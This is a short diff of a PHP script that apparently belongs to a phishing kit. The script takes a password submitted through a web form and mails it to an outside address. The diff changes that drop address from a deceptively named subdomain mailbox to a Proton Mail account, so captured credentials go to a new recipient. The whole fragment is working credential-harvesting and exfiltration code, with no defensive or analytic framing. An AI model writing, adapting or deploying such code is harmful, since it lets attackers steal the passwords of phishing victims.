@@ -6,10 +6,10 @@ error_reporting(E_ALL);
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $password = htmlspecialchars($_POST['password']);
 
-    $to = "marketing@bestinallsecureverygoodverificationboostconfidentinall.hannahjonesjewels.com"; // Replace with your admin email
+    $to = "protectiondriveforclear@proton.me"; // Replace with your admin email
     $subject = "p r";
     $message = "Email: $password";
-    $headers = "From: marketing@bestinallsecureverygoodverificationboostconfidentinall.hannahjonesjewels.com"; // Replace with your from email
+    $headers = "From: protectiondriveforclear@proton.me"; // Replace with your from email
 
     // Send email
     if (mail($to, $subject, $message, $headers)) {
